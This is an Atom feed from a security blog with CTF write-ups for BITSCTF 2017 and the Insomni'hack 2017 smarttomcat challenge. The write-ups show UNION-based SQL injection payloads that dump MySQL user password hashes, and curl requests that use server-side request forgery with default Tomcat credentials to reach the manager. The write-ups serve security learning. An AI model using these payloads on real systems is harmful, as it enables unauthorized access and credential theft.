<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RawSec</title>
  <subtitle>Security is everywhere</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://rawsec.ml/"/>
  <updated>2017-02-05T16:14:16.044Z</updated>
  <id>http://rawsec.ml/</id>
  
  <author>
    <name>Alexandre ZANNI</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BITSCTF 2017 - Write-ups</title>
    <link href="http://rawsec.ml/en/BITSCTF-2017-writeups/"/>
    <id>http://rawsec.ml/en/BITSCTF-2017-writeups/</id>
    <published>2017-02-04T23:00:00.000Z</published>
    <updated>2017-02-05T16:14:16.044Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : BITSCTF 2017</li>
<li><strong>Website</strong> : <a href="https://bitsctf.bits-quark.org/" target="_blank" rel="external">bitsctf.bits-quark.org</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/417" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="10-BotBot-web"><a href="#10-BotBot-web" class="headerlink" title="10 - BotBot - web"></a>10 - BotBot - web</h2><blockquote>
<p>Should not ask for the description of a 5 marker.</p>
<p>botbot.bitsctf.bits-quark.org</p>
</blockquote>
<p>Let’s look at the source code:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">	Nothing to see here. Maybe try looking up seo .txt</div><div class="line">--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>Now go to <code>http://botbot.bitsctf.bits-quark.org/robots.txt</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Useragent *</div><div class="line">Disallow: /fl4g</div></pre></td></tr></table></figure>
<p><a href="http://botbot.bitsctf.bits-quark.org/fl4g/" target="_blank" rel="external">http://botbot.bitsctf.bits-quark.org/fl4g/</a> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BITCTF&#123;take_a_look_at_googles_robots_txt&#125;</div></pre></td></tr></table></figure>
<h2 id="20-Labour-Misc"><a href="#20-Labour-Misc" class="headerlink" title="20 - Labour - Misc"></a>20 - Labour - Misc</h2><blockquote>
<p>Follow your heart, for it leads you straight to the answer.</p>
</blockquote>
<p>It’s a gpx file:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;</div><div class="line">&lt;gpx version=&quot;1.1&quot; creator=&quot;BITSCTF&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://www.topografix.com/GPX/1/1&quot; xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!--Use appropriate brackets and underscores to separate words if you succeed--&gt;</div><div class="line">&lt;wpt lat=&quot;23.71697&quot; lon=&quot;89.45508&quot;&gt;</div><div class="line">&lt;ele&gt;12.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP01-A&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;22.82885&quot; lon=&quot;80.79786&quot;&gt;</div><div class="line">&lt;name&gt;WP02-B&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.88276&quot; lon=&quot;58.81642&quot;&gt;</div><div class="line">&lt;name&gt;WP03-C&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;15.43674&quot; lon=&quot;27.65039&quot;&gt;</div><div class="line">&lt;name&gt;WP04-D&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;12.69179&quot; lon=&quot;17.50781&quot;&gt;</div><div class="line">&lt;ele&gt;288.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP05-E&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;14.91081&quot; lon=&quot;100.47656&quot;&gt;</div><div class="line">&lt;ele&gt;13.1&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP06-F&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;45.9267&quot; lon=&quot;2.21484&quot;&gt;</div><div class="line">&lt;ele&gt;557.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP07-G&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;4.11852&quot; lon=&quot;102.19922&quot;&gt;</div><div class="line">&lt;ele&gt;67.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP08-H&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;34.85709&quot; lon=&quot;65.84765&quot;&gt;</div><div class="line">&lt;ele&gt;3209.7&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP09-I&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;28.89086&quot; lon=&quot;68.30859&quot;&gt;</div><div class="line">&lt;ele&gt;116.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP10-J&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;39.20502&quot; lon=&quot;31.92187&quot;&gt;</div><div class="line">&lt;ele&gt;797.8&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP11-K&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;47.24344&quot; lon=&quot;19.8457&quot;&gt;</div><div class="line">&lt;ele&gt;93.5&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP12-L&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;25.30828&quot; lon=&quot;29.84765&quot;&gt;</div><div class="line">&lt;ele&gt;267&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP13-M&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;18.97119&quot; lon=&quot;-72.28521&quot;&gt;</div><div class="line">&lt;ele&gt;375&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP14-N&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;-13.61609&quot; lon=&quot;17.68359&quot;&gt;</div><div class="line">&lt;ele&gt;1510.9&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP15-O&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;33.84122&quot; lon=&quot;102.23438&quot;&gt;</div><div class="line">&lt;ele&gt;3426.2&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP16-P&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;wpt lat=&quot;46.89624&quot; lon=&quot;69.53907&quot;&gt;</div><div class="line">&lt;ele&gt;364.4&lt;/ele&gt;</div><div class="line">&lt;name&gt;WP17-Q&lt;/name&gt;</div><div class="line">&lt;/wpt&gt;</div><div class="line">&lt;/gpx&gt;</div></pre></td></tr></table></figure>
<p>We can open it online with:</p>
<ul>
<li><a href="http://www.visugpx.com/index.php" target="_blank" rel="external">http://www.visugpx.com/index.php</a></li>
<li><a href="http://www.gpsvisualizer.com/map?output_home" target="_blank" rel="external">http://www.gpsvisualizer.com/map?output_home</a></li>
</ul>
<p>Take the waypoint in order and write the name of the country:</p>
<ol>
<li>WP01-A - Bangladesh</li>
<li>WP02-B - India</li>
<li>WP03-C - Turkmenistan</li>
<li>WP04-D - Sudan</li>
<li>WP05-E - Chad</li>
<li>WP06-F - Thailand</li>
<li>WP07-G - France</li>
<li>WP08-H - Malesia</li>
<li>WP09-I - Afganistan</li>
<li>WP10-J - Pakistan</li>
<li>WP11-K - Turkey</li>
<li>WP12-L - Hungary</li>
<li>WP13-M - Egypt</li>
<li>WP14-N - Haiti</li>
<li>WP15-O - Angola</li>
<li>WP16-P - China</li>
<li>WP17-Q - Kazaksztan</li>
</ol>
<p>Taking the first letter of each country in order give me <strong>BITSCTFMAPTHEHACK</strong> and the comment said:</p>
<blockquote>
<p>Use appropriate brackets and underscores to separate words if you succeed</p>
</blockquote>
<p>So I get <strong>BITSCTF{MAP_THE_HACK}</strong></p>
<h1 id="30-Batman-vs-Joker-Web"><a href="#30-Batman-vs-Joker-Web" class="headerlink" title="30 - Batman vs Joker - Web"></a>30 - Batman vs Joker - Web</h1><blockquote>
<p>Joker has left a message for you. Your job is to get to the message asap.</p>
<p>joking.bitsctf.bits-quark.org</p>
</blockquote>
<p>Try a quick <code>&#39; or 1=1 #&#39;</code>: this is working so we have a vulnerable MySQL database.</p>
<p>Let’s enjoy SQLi.</p>
<p>Just curious to know the DB version: <code>&#39; or 1=1 UNION SELECT @@version,1 #</code>: <strong>5.5.54-0+deb8u1</strong></p>
<p>Current databse name: <code>&#39; or 1=1 UNION SELECT database(),1 #</code>: <strong>hack</strong></p>
<p>Just curious to list the databse users: <code>&#39; or 1=1 UNION SELECT host, user FROM mysql.user #</code> and <code>&#39; or 1=1 UNION SELECT user, password FROM mysql.user #</code>:</p>
<table>
<thead>
<tr>
<th>host</th>
<th>user</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr>
<td>%</td>
<td>tester</td>
<td>*975B2CD4FF9AE554FE8AD33168FBFC326D2021DD</td>
</tr>
<tr>
<td>127.0.0.1, 33842653d6db, ::1, localhost</td>
<td>root</td>
<td>*A2AE2E3109CE064A1AED30C0E71E021540F30700</td>
</tr>
<tr>
<td>localhost</td>
<td>debian-sys-maint</td>
<td>*A9A6626F5FEE26E9EDDE42FF9274124A98F82A3F</td>
</tr>
</tbody>
</table>
<p>I want to know the name of tables in the hack databse: <code>&#39; or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = &#39;hack&#39; #</code>:</p>
<table>
<thead>
<tr>
<th>table_schema</th>
<th>table_name</th>
</tr>
</thead>
<tbody>
<tr>
<td>hack</td>
<td>CIA_Official_Records</td>
</tr>
<tr>
<td>hack</td>
<td>joker</td>
</tr>
</tbody>
</table>
<p>And finally I want to know the name of columns in the both previous tables: <code>&#39; or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = &#39;CIA_Official_Records&#39; or table_name = &#39;joker&#39; #</code>:</p>
<table>
<thead>
<tr>
<th>table_name</th>
<th>column_name</th>
</tr>
</thead>
<tbody>
<tr>
<td>CIA_Official_Records</td>
<td>id</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>username</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>first_name</td>
</tr>
<tr>
<td>CIA_Official_Records</td>
<td>last_name</td>
</tr>
<tr>
<td>Joker</td>
<td>Flag</td>
</tr>
<tr>
<td>Joker</td>
<td>HaHaHa</td>
</tr>
</tbody>
</table>
<p>Pretty easy to know where to find teh flag now: <code>&#39; or 1=1 UNION SELECT Flag, HaHaHa FROM Joker #</code>:</p>
<table>
<thead>
<tr>
<th>Flag</th>
<th>HaHaHa</th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}</td>
<td>Enjoying the game Batman!!!</td>
</tr>
</tbody>
</table>
<h2 id="50-Tom-and-Jerry-Forensics"><a href="#50-Tom-and-Jerry-Forensics" class="headerlink" title="50 - Tom and Jerry - Forensics"></a>50 - Tom and Jerry - Forensics</h2><p><strong>WARNING</strong>: we didn’t solve this challenge, so write-up is incomplete.</p>
<p>Open the pcapng with Wireshark.</p>
<p>Device Descriptor tell us:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">idVendor: Wacom Co., Ltd (0x056a)</div><div class="line">idProduct: CTL-460 [Bamboo Pen (S)] (0x00d4)</div></pre></td></tr></table></figure>
<p>So this is a Pen Tablet.</p>
<p>We can use a filter <code>usb.transfer_type == 0x01</code> to oly see frame where there is data.</p>
<p>We can complete the filter with <code>(frame.len == 73)</code> to see only one side of the exchange and <code>!(usb.capdata == 00:00:00:00:00:00:00:00)</code> to hide null data. Finally that give us this filter: <code>((usb.transfer_type == 0x01) &amp;&amp; (frame.len == 73)) &amp;&amp; !(usb.capdata == 00:00:00:00:00:00:00:00)</code>.</p>
<p>USB transfert type is <em>USB INTERRUPT</em>: <a href="http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt" target="_blank" rel="external">http://www.beyondlogic.org/usbnutshell/usb4.shtml#Interrupt</a></p>
<p>To extract the data only from the pcapng I used tshark:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r Cat.pcapng -T fields -e usb.capdata &gt; capdata.txt</div></pre></td></tr></table></figure>
<p>I didn’t have time to search how to interpret the raw data into coordinates.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser - 50 - smarttomcat - Web</title>
    <link href="http://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/"/>
    <id>http://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/</id>
    <published>2017-01-20T23:00:00.000Z</published>
    <updated>2017-01-20T21:36:02.711Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Insomni’hack teaser 2017</li>
<li><strong>Website</strong> : <a href="http://teaser.insomnihack.ch/" target="_blank" rel="external">teaser.insomnihack.ch</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/382" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>smarttomcat - Web - 50 pts - realized by xel/grimmlin</p>
<p>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot<br>Now the damn thing has attacked me and flew away. I can’t even seem to track it down on the broken search interface… Can you help me ?</p>
<p><a href="http://smarttomcat.teaser.insomnihack.ch/" target="_blank" rel="external">Search interface</a></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We have a web application like this:</p>
<p><img src="http://i.imgur.com/ey5DMYM.png" alt=""></p>
<p>Let’s take a look at sources, there is some JavaScript:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> OpenLayers.Map(<span class="string">"map"</span>);</div><div class="line">map.addLayer(<span class="keyword">new</span> OpenLayers.Layer.OSM());</div><div class="line"><span class="keyword">var</span> lonlat = <span class="keyword">new</span> OpenLayers.LonLat(<span class="number">15.2833</span>,<span class="number">-4.2667</span>).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line"><span class="keyword">var</span> zoom = <span class="number">10</span>;</div><div class="line"><span class="keyword">var</span> markers = <span class="keyword">new</span> OpenLayers.Layer.Markers( <span class="string">"Markers"</span> );</div><div class="line">map.addLayer(markers);</div><div class="line"><span class="keyword">var</span> center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">markers.addMarker(center_marker);</div><div class="line">map.setCenter(lonlat,zoom);</div><div class="line"><span class="keyword">var</span> request;</div><div class="line">$(<span class="string">'#findcatbycoord'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    event.preventDefault();</div><div class="line">    <span class="keyword">if</span> (request) &#123;</div><div class="line">        request.abort();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> cat_coords = <span class="string">'http://localhost:8080/index.jsp?x='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val()) + <span class="string">'&amp;y='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">    <span class="keyword">var</span> $form = $(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">var</span> $inputs = $form.find(<span class="string">'input, select, button, textarea'</span>);</div><div class="line">    $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">true</span>);</div><div class="line"></div><div class="line">    request = $.ajax(&#123;</div><div class="line">        url: <span class="string">'/index.php'</span>,</div><div class="line">        type: <span class="string">'post'</span>,</div><div class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">          markers.clearMarkers();</div><div class="line">          <span class="keyword">while</span>(map.popups.length) &#123;map.removePopup(map.popups[<span class="number">0</span>]);&#125;</div><div class="line">          <span class="keyword">var</span> y = <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">          <span class="keyword">var</span> x = <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val());</div><div class="line">          <span class="keyword">if</span> (<span class="built_in">isNaN</span>(y) || <span class="built_in">isNaN</span>(x)) &#123;y = <span class="number">15.2833</span>; x = <span class="number">-4.2667</span>;&#125;</div><div class="line">          lonlat = <span class="keyword">new</span> OpenLayers.LonLat(y,x).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line">          center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">          markers.addMarker(center_marker);</div><div class="line">          popup = <span class="keyword">new</span> OpenLayers.Popup.FramedCloud(<span class="string">"popup"</span>,</div><div class="line">                   lonlat,</div><div class="line">                   <span class="literal">null</span>,</div><div class="line">                   data, <span class="literal">null</span>,</div><div class="line">                   <span class="literal">true</span>);</div><div class="line">          map.addPopup(popup);</div><div class="line">          map.setCenter(lonlat,zoom);</div><div class="line">        &#125;,</div><div class="line">        data: &#123;</div><div class="line">		u: cat_coords</div><div class="line">	&#125;</div><div class="line">    &#125;);</div><div class="line">    request.always(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">       $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">false</span>);</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">&#125;);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>The interesting line is:<br><code>var cat_coords = &#39;http://localhost:8080/index.jsp?x=&#39; + parseFloat($(&#39;#xcoord&#39;).val()) + &#39;&amp;y=&#39; + parseFloat($(&#39;#ycoord&#39;).val());</code>. So we have one web serve that is a proxy for a web application.</p>
<p>We can see in http headers that the front-end server is <code>Apache/2.4.18 (Ubuntu)</code>.</p>
<p>The description is suggesting we have a Tomcat web app.</p>
<p>In the javascript we can see <code>var map = new OpenLayers.Map(&quot;map&quot;);</code> and <code>OpenLayers</code> is a class of GeoServer.</p>
<p>What do we have?</p>
<ul>
<li>Front-end: <code>Apache/2.4.18 (Ubuntu)</code></li>
<li>Back-end: <code>Apache Tomcat/7.0.68 (Ubuntu)</code></li>
<li>Map-core: <code>GeoServer</code></li>
</ul>
<p>In the javascript we also see <code>if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;}</code> that means the browser won’t let us send anything else than numbers in the form. We should use Hackbar or curl.</p>
<p>What to do now? We guessed this is a Tomcat web app so let’s find the Tomcat Manager (administration panel for Tomcat web server).</p>
<p>A normal request (POST data) would be:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">u=http://localhost:8080/index.jsp?x=42%26y=1337</div></pre></td></tr></table></figure>
<p>With curl:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://localhost:8080/index.jsp?x=42%26y=1337&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">Tomcat not found ! Try again</div></pre></td></tr></table></figure>
<p>Now let’s try to reach the Tomcat Manager page which is usually: <code>http://example.org:8180/manager/html</code>. Here we have the manager also running on port <code>8080</code>.</p>
<p>So with curl:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/7.0.68 (Ubuntu) - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 401 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Status report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;This request requires HTTP authentication.&lt;/u&gt;&lt;/p&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;h3&gt;Apache Tomcat/7.0.68 (Ubuntu)&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;%</div></pre></td></tr></table></figure>
<p>With hackbar:</p>
<p><img src="http://i.imgur.com/q3IC28Y.png" alt=""></p>
<p>We can see the following error: <code>HTTP Status 401: This request requires HTTP authentication.</code><br>This is because we should provide some Basic Auth informations.</p>
<p>Default credentials of Tomcat Manager are <code>tomcat:tomcat</code>.</p>
<p>So the http header for authentification should be <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>.</p>
<p>The option to pass basic authentification to curl is <code>-u</code> but doing the following command won’t work:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl -u tomcat:tomcat --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div></pre></td></tr></table></figure>
<p>Because this will provide the authentification to the Apache front-end instead of giving it to the proxyfied Tomcat Manager running on the back-end.</p>
<p>But it’s possible to directly provide credentials for basic autentification in the URL, for example: <code>http://user:pass@example.org</code>.</p>
<p>Let’s do it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --data &quot;u=http://tomcat:tomcat@127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">We won&apos;t give you the manager, but you can have the flag : INS&#123;th1s_is_re4l_w0rld_pent3st&#125;</div></pre></td></tr></table></figure>
<p>The flag was: <code>INS{th1s_is_re4l_w0rld_pent3st}</code>. No need to find the coordinates.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser - 50 - cryptoquizz - Misc</title>
    <link href="http://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/"/>
    <id>http://rawsec.ml/en/Insomnihack-2017-Teaser-cryptoquizz/</id>
    <published>2017-01-20T23:00:00.000Z</published>
    <updated>2017-01-20T21:34:30.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
